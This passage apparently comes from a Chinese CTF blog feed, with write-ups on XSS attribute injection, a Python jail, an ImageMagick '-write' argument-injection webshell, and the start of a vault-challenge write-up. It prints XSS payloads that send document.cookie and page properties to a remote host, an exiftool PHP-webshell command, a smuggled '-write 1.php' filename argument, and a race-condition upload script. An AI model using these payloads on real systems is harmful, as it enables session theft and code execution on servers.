class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$IMG</span> = <span class="hljs-string">&#x27;https://i.imgur.com/nh16rl8.png&#x27;</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>] ?? <span class="hljs-variable">$IMG</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$url</span> !== <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^https?:\/\/.+/i&#x27;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>  <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">400</span>);<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/plain; charset=utf-8&#x27;</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;url must start with http(s)://&#x27;</span>;<br>  <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render_img_markdown</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$s</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>    <span class="hljs-string">&#x27;/!\[ \]\(([^)\r\n]*)\)/&#x27;</span>,<br>    <span class="hljs-string">&quot;&lt;img src=&#x27;<span class="hljs-subst">$1</span>&#x27; loading=&#x27;lazy&#x27;&gt;&quot;</span>,<br>    <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-string">&#x27;![ ](&#x27;</span> . <span class="hljs-variable">$s</span> . <span class="hljs-string">&#x27;)&#x27;</span>, ENT_HTML5, <span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>  );<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    ...<br>&lt;h2&gt;Preview&lt;/h2&gt;<br>&lt;div&gt;<span class="hljs-meta">&lt;?=</span> <span class="hljs-title function_ invoke__">render_img_markdown</span>(<span class="hljs-variable">$url</span>) <span class="hljs-meta">?&gt;</span>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>很明显xss的注入点就在url</p><p>因为是插到img标签的src属性里，我们可以利用属性注入，插入一个onerror属性来执行恶意js</p><p>尝试插入 <a href="http://a/">http://a</a>‘ onerror&#x3D;alert(1)，失败了</p><p><img src="/2025/11/09/infobahnctf2025-wp/image-20251110000119858.png" alt="image-20251110000119858"></p><p>分析发现是因为render_img_markdown函数在正则匹配的时候匹配到右括号就结束，所以payload里不能出现右括号</p><p>不能用右括号的话可以使用反引号来代替</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//x</span><span class="hljs-string">&#x27; onerror=&#x27;</span>alert<span class="hljs-string">`1`</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/11/09/infobahnctf2025-wp/image-20251110000616134.png" alt="image-20251110000616134"></p><p>接下来想办法读cookie传到服务器就行了</p><p>这里做法很多，给出一种payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>x<span class="hljs-string">&#x27; onerror=&#x27;</span>this.src=`http:<span class="hljs-regexp">//y</span>ou-vps/?f=`+document.cookie<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="bitsets"><a href="/2025/11/09/infobahnctf2025-wp/#bitsets" class="headerlink" title="bitsets"></a>bitsets</h1><p>这次要拿到flag2 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> flag23;<br><span class="hljs-keyword">if</span> (q.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">55</span>) &#123;<br>  flag23 = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG3</span> || <span class="hljs-string">&quot;infobahn&#123;fake_flag3&#125;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">111</span>) &#123;<br>  flag23 = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG2</span> || <span class="hljs-string">&quot;infobahn&#123;fake_flag2&#125;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (flag23) &#123;<br>  <span class="hljs-keyword">await</span> p.<span class="hljs-title function_">evaluateOnNewDocument</span>(<span class="hljs-function"><span class="hljs-params">flag</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (location.<span class="hljs-property">hostname</span> == <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>      <span class="hljs-variable language_">document</span>[<span class="hljs-string">&quot;flag&quot;</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>().<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>)] = flag;<br>    &#125;<br>  &#125;, flag23);<br>&#125;<br></code></pre></td></tr></table></figure><p>flag放在了一个属性里面，属性的名字是随机的，并且要求payload的长度小于111</p><p>首先先不考虑长度，要获取到这个随机的属性的内容，肯定先考虑遍历</p><p>用for循环遍历所有属性，找到属性名是flag开头的，然后使用document[i]读出来传到服务器，但是考虑长度的话，我选的是遍历所有属性把他们都传到服务器，就一定能找到flag，并且长度也没问题</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">for</span>(i <span class="hljs-keyword">in</span> <span class="hljs-variable language_">document</span>)<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://106.14.70.254/&#x27;</span>+<span class="hljs-variable language_">document</span>[i])<br></code></pre></td></tr></table></figure><p>这里遇到一个问题，前面说了，无法使用右括号，于是就来到了最关键的部分——利用js伪协议+url编码</p><p>把右括号编码之后就不会被匹配到了，以alert为例</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//x</span><span class="hljs-string">&#x27; onerror=&quot;location=&#x27;</span>javascript:alert<span class="hljs-variable">%28</span>1<span class="hljs-variable">%29</span><span class="hljs-string">&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>把后面这一串赋值给window.location的时候，浏览器这个字符串当作url来解析，发现是js伪协议，会对后面的部分进行url解码，于是就能成功执行alert(1)</p><p>但是考虑到url编码会让长度变长，所以我们编码尽可能少的字符</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//x</span><span class="hljs-string">&#x27; onerror=&quot;location=&#x27;</span>javascript:<span class="hljs-keyword">for</span>(i in document<span class="hljs-variable">%29open</span>(<span class="hljs-variable">%27http</span>:<span class="hljs-regexp">//</span><span class="hljs-number">106.14</span><span class="hljs-number">.70</span><span class="hljs-number">.254</span>/<span class="hljs-variable">%27</span>+document[i]<span class="hljs-variable">%29</span><span class="hljs-string">&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>这个payload长度再109，勉强满足111的要求</p><h1 id="bitset-revenge-bitsets-revenge"><a href="/2025/11/09/infobahnctf2025-wp/#bitset-revenge-bitsets-revenge" class="headerlink" title="bitset revenge&amp;bitsets revenge"></a>bitset revenge&amp;bitsets revenge</h1><p>使用相同的payload可以直接打，相比是非预期了（</p><h1 id="speechless"><a href="/2025/11/09/infobahnctf2025-wp/#speechless" class="headerlink" title="speechless"></a>speechless</h1><p>一道有趣的jail，感觉自己的解法也是非预期，<del>有点像数学题了</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">allowed = <span class="hljs-string">&quot;ab.=-/&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read()<br>a = <span class="hljs-literal">None</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    expr = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">all</span>(char <span class="hljs-keyword">in</span> allowed <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> expr):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;you need to try harder&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;blocked&#125;</span>==&quot;</span> <span class="hljs-keyword">in</span> expr <span class="hljs-keyword">or</span> <span class="hljs-string">f&quot;==<span class="hljs-subst">&#123;blocked&#125;</span>&quot;</span> <span class="hljs-keyword">in</span> expr <span class="hljs-keyword">for</span> blocked <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ab&quot;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stop comparing the flag&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">try</span>:<br>        a = <span class="hljs-built_in">eval</span>(expr, &#123;<span class="hljs-string">&quot;a&quot;</span>: a&#125; | &#123;<span class="hljs-string">&quot;b&quot;</span> * (index + <span class="hljs-number">1</span>): char <span class="hljs-keyword">for</span> index, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(flag)&#125;)<br>        <span class="hljs-built_in">print</span>(a)<br>    <span class="hljs-keyword">except</span>:<br>        a = <span class="hljs-literal">None</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stop breaking things &gt;:(&#x27;</span>)<br></code></pre></td></tr></table></figure><p>你只能输入ab.&#x3D;-&#x2F;，输入b会返回flag的第一位，bb返回第二位，以此类推，并且将每次输入的返回值存到a里面，比如先输入bb，再输入a，就会返回flag的第二位</p><p>解法：</p><p>​以第一位为例，我们先输入b，此时a&#x3D;flag[0]</p><p>​如果我能让a逐渐减小，判断减小多少的时候a变成了0，那我就能知道flag[0]的值是多少了</p><p>​那么要减去谁呢，需要找一个不变值，这里使用b&#x2F;&#x2F;b得到1</p><p>​流程：</p><p>​输入b，此时a&#x3D;flag[0]</p><p>​输入a-b&#x2F;&#x2F;b，此时a&#x3D;flag[0]-1</p><p>​利用除数不能为0判断a此时是否等于0，输入b&#x2F;&#x2F;a，若报错，说明a此时为0，那么第一位的ascii码就是1，如果不为0，则进入下一步</p><p>​输入b，再输入a-b&#x2F;&#x2F;b-b&#x2F;&#x2F;b，随后以此类推，重复上述步骤，直到报错，就能判断出这一位的值了</p><p>不难看出，此方法比较花时间，搓个脚本，爆一位需要上千次，但是思路是没问题的，写脚本的时候可以考虑一些优化的方法来加快爆破速度&#x2F;减少爆破次数，核心优化思路是减少发包的次数，篇幅的原因脚本这里就不贴了，找ai就能搓</p><h1 id="总结"><a href="/2025/11/09/infobahnctf2025-wp/#总结" class="headerlink" title="总结"></a>总结</h1><p>感觉基本都是打的非预期，不过学到一些xss的点，主要就是js伪协议+url编码</p>]]></content>
    
    
    
    <tags>
      
      <tag>-wp -xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>m0leconctf--命令参数注入</title>
    <link href="/2025/10/27/m0leconctf-%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/10/27/m0leconctf-%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="/2025/10/27/m0leconctf-命令参数注入/#前言" class="headerlink" title="前言"></a>前言</h1><p>最近事情比较多，题做得比较少了，周末打了一个国外的比赛，考察的点是命令参数注入</p><h1 id="题目"><a href="/2025/10/27/m0leconctf-命令参数注入/#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$proc</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<br>        <span class="hljs-variable">$cmd</span> = [<br>            <span class="hljs-string">&#x27;/opt/convert.sh&#x27;</span>,<br>            <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;img&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<br>            <span class="hljs-variable">$outputName</span> = <span class="hljs-string">&#x27;static/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27;.png&#x27;</span><br>        ],<br>        [],<br>        <span class="hljs-variable">$pipes</span><br>    );<br>    <span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$proc</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>题目大概就是上传一个图片，然后回执行convert.sh脚本对图片进行处理，然后保存到static目录，并且可以自己指定文件名</p><p><strong>&#x2F;opt&#x2F;convert.sh</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">set</span> -x<br>convert <span class="hljs-variable">$1</span> -resize 64x64 -background none -gravity center -extent 64x64 <span class="hljs-variable">$2</span><br>find . -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> exiftool -overwrite_original -all= &#123;&#125; + &gt;/dev/null 2&gt;&amp;1 || <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h1 id="分析"><a href="/2025/10/27/m0leconctf-命令参数注入/#分析" class="headerlink" title="分析"></a>分析</h1><p>先简单介绍下sh脚本</p><p><strong>convert</strong>命令是ImageMagick软件包中的一部分，用于在不同的图像格式之间进行转换，并支持多种图像处理操作。</p><p>这里的$1就是上传的文件的临时路径，$2是保存的位置，<del>看起来貌似可以实现命令拼接</del></p><p><strong>Exiftool</strong> 是一个命令行应用程序和 Perl 库，允许您读取和写入图像、音频和视频文件中的 EXIF、GPS、IPTC、XMP、makernotes 和其他元数据信息</p><p>这个脚本实现了对上传图片进行处理，然后利用exiftool清楚当前文件夹的所有文件的元数据</p><p>首先执行命令时使用的是php的数组，这就导致了命令拼接的思路不可取了，因为他会把;等常用的拼接字符也当作字符串的一部分</p><p>那么我就开始寻找其他地方的问题，考虑exiftool会不会有什么问题</p><p>于是我找到CVE-2021-22204  允许攻击者通过恶意构造的图像文件实现任意代码执行。该漏洞影响 ExifTool 版本 7.44 至 12.23</p><p>尝试复现了一下也成功了</p><p><img src="/2025/10/27/m0leconctf-命令参数注入/image-20251027225237050.png" alt="image-20251027225237050"></p><p>接下来需要确认一下环境的exiftool命令的版本，但是这个时候我发现了一个问题</p><style>.qgwcxvvuimuf{zoom:50%;}</style><img src="/2025/10/27/m0leconctf-命令参数注入//2025/10/27/m0leconctf-%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/image-20251027225324510.png" class="qgwcxvvuimuf" alt="image-20251027225324510"><p>他的dockerfile里面根本没有安装exiftool，也没有创建static目录，这会导致无法正常的把处理后的文件保存，也不会清理元数据，当然这个漏洞也没用了</p><p>那么接下来只能从别的方向思考了</p><p>根据题目的描述ImageMagick，我们尝试搜索一下这个相关的东西，就不难发现这里存在参数注入</p><p>$1和$2虽然无法进行命令注入了，但是如果你使用-这样的字符，就会让后面的内容变成命令的参数了</p><p>下面思考一下我们需要注入什么。根据题目给的附件不难看出，flag是root才可读的，想读取flag只能利用它编译的readflag命令</p><p><img src="/2025/10/27/m0leconctf-命令参数注入/image-20251027225933933.png" alt="image-20251027225933933"></p><p><a href="https://book.jorianwoltjer.com/web/server-side/imagemagick#argument-injection">https://book.jorianwoltjer.com/web/server-side/imagemagick#argument-injection</a></p><p>这篇文章提到了convert命令参数注入时用到的一个参数 -write，会将图像写入到指定的路径</p><p>那么这就解决了我们现在的问题，首先是我们可以控制文件保存的位置了，不会因为static目录不存在而报错，其次是我们可以讲图片的内容写入到一个文件，那就相当于可以实现任意文件写入了，我们就可以传🐎来读文件。</p><p>但是随之而来的还有一个问题，就是convert命令在处理的时候，文件必须是一个有效的png文件，否则就会拒绝写入，但是这样我们又无法保证我们的php代码的完整性</p><p>这时候想到，sh脚本的第二条命令清除了文件的元数据，难道元数据有什么问题吗</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso">图片元数据（metadata）是嵌入到图片文件中的一些标签。比较像文件属性，但是种类繁多。常见的几种标准有：<br><br>EXIF：通常被数码相机在拍摄照片时自动添加，比如相机型号、镜头、曝光、图片尺寸等信息。<br>IPTC：比如图片标题、关键字、说明、作者、版权等信息。<br>XMP：由Adobe公司制定标准，以<span class="hljs-built_in">XML</span>格式保存。用PhotoShop等Adobe公司的软件制作的图片通常会携带这种信息。<br></code></pre></td></tr></table></figure><p>显然元数据并不是png正文的一部分，而是类似于图片的注释的东西，并且是用原始的可读字符保存的</p><p>那我们是不是可以把🐎写到元数据里面，然后再通过参数注入写到一个php文件中，就能读到flag了</p><p>给图片写元数据可以利用exiftool工具,test.png用正常png即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">exiftool -Comment=<span class="hljs-string">&#x27;&lt;?php system(&quot;/readflag&quot;); ?&gt;&#x27;</span> test.png -o evil.png<br></code></pre></td></tr></table></figure><p>然后在上传evil.png的时候指定name&#x3D;1 -write 1.php 2</p><p>这样想必就能把🐎写到1.php中，这题到这里就结束了</p><p>但是如果环境正常的话，exiftool会在convert处理完图片之后，清楚当前目录下的文件的元数据，我们写的🐎就会被清掉，所以需要条件竞争</p><p>得到脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> threading<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">&quot;evil.png&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment">#创建合法png</span><br>    f.write(base64.b64decode(<span class="hljs-string">&quot;iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQAAAAA3bvkkAAAACklEQVR4AWNgAAAAAgABc3UBGAAAAABJRU5ErkJggg==&quot;</span>))<br><br>payload = <span class="hljs-string">&quot;&lt;?php var_dump(system(&#x27;/readflag&#x27;));?&gt;&quot;</span><br><br>subprocess.check_output([<span class="hljs-string">&#x27;exiftool&#x27;</span>,<span class="hljs-string">f&quot;-comment=<span class="hljs-subst">&#123;payload&#125;</span>&quot;</span>,<span class="hljs-string">&#x27;evil.png&#x27;</span>])   <span class="hljs-comment">#写入恶意payload到元数据</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writefile</span>():<br>    res = requests.post(url=url,data=&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;a -write 1.php b&quot;</span>&#125;,files=&#123;<span class="hljs-string">&quot;img&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;evil.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()&#125;)<br>    <span class="hljs-keyword">assert</span> res.status_code == <span class="hljs-number">200</span>,res.status_code<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readflag</span>():<br>    res2 = requests.get(url=url+<span class="hljs-string">&quot;/1.php&quot;</span>)<br>    <span class="hljs-built_in">print</span>(res2.text)<br><br>thread1 = threading.Thread(target=writefile,args=())<br>thread2 = threading.Thread(target=readflag,args=())<br><br>thread1.start()<br>thread2.start() <span class="hljs-comment">#多线程竞争</span><br><br>thread1.join()<br>thread2.join()<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="/2025/10/27/m0leconctf-命令参数注入/#总结" class="headerlink" title="总结"></a>总结</h1><p>这题给的环境既是提示，但是由于它的配置又容易误导人，总的来接触了一下参数注入，不管什么注入，其实都是利用命令执行的时候的闭合符号或者一些特殊的符号破坏命令原本的结构，让其执行一些违背目的的操作</p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2025wp</title>
    <link href="/2025/10/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2025wp/"/>
    <url>/2025/10/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2025wp/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="/2025/10/21/强网杯2025wp/#前言" class="headerlink" title="前言"></a>前言</h1><p>被薄纱了，web只出了最简单的三题，做php的时候是真被绕晕了….</p><h1 id="SecretVault"><a href="/2025/10/21/强网杯2025wp/#SecretVault" class="headerlink" title="SecretVault"></a>SecretVault</h1><p>这题实现了一个密码本的功能，go实现一个代理，后端用python</p><p>首先找flag在哪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> User.query.first():<br>    salt = secrets.token_bytes(<span class="hljs-number">16</span>)<br>    password = secrets.token_bytes(<span class="hljs-number">32</span>).<span class="hljs-built_in">hex</span>()<br>    password_hash = hash_password(password, salt)<br>    user = User(<br>        <span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>,<br>        username=<span class="hljs-string">&#x27;admin&#x27;</span>,<br>        password_hash=password_hash,<br>        salt=base64.b64encode(salt).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>    )<br>    db.session.add(user)<br>    db.session.commit()<br><br>    flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).read().strip()<br>    flagEntry = VaultEntry(<br>        user_id=user.<span class="hljs-built_in">id</span>,<br>        label=<span class="hljs-string">&#x27;flag&#x27;</span>,<br>        login=<span class="hljs-string">&#x27;flag&#x27;</span>,<br>        password_encrypted=fernet.encrypt(flag.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>        notes=<span class="hljs-string">&#x27;This is the flag entry.&#x27;</span>,<br>    )<br>    db.session.add(flagEntry)<br>    db.session.commit()<br></code></pre></td></tr></table></figure><p>flag就在admin的密码里，所以想那道flag就必须以admin登录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard&#x27;</span></span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dashboard</span>():<br>    user = g.current_user<br>    entries = [<br>        &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: entry.<span class="hljs-built_in">id</span>,<br>            <span class="hljs-string">&#x27;label&#x27;</span>: entry.label,<br>            <span class="hljs-string">&#x27;login&#x27;</span>: entry.login,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: fernet.decrypt(entry.password_encrypted.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>            <span class="hljs-string">&#x27;notes&#x27;</span>: entry.notes,<br>            <span class="hljs-string">&#x27;created_at&#x27;</span>: entry.created_at,<br>        &#125;<br>        <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> user.vault_entries<br>    ]<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;dashboard.html&#x27;</span>, username=user.username, entries=entries)<br></code></pre></td></tr></table></figure><p>这个接口会展示该用户的所有密码，如果我们的身份是admin就可以访问到flag，分析一下鉴权方式，显然是在装饰器login_required里面校验的用户身份</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">login_required</span>(<span class="hljs-params">view_func</span>):<br><span class="hljs-meta">    @wraps(<span class="hljs-params">view_func</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapped</span>(<span class="hljs-params">*args, **kwargs</span>):<br>        uid = request.headers.get(<span class="hljs-string">&#x27;X-User&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(uid)<br>        <span class="hljs-keyword">if</span> uid == <span class="hljs-string">&#x27;anonymous&#x27;</span>:<br>            flash(<span class="hljs-string">&#x27;Please sign in first.&#x27;</span>, <span class="hljs-string">&#x27;warning&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        <span class="hljs-keyword">try</span>:<br>            uid_int = <span class="hljs-built_in">int</span>(uid)<br>        <span class="hljs-keyword">except</span> (TypeError, ValueError):<br>            flash(<span class="hljs-string">&#x27;Invalid session. Please sign in again.&#x27;</span>, <span class="hljs-string">&#x27;warning&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        user = User.query.filter_by(<span 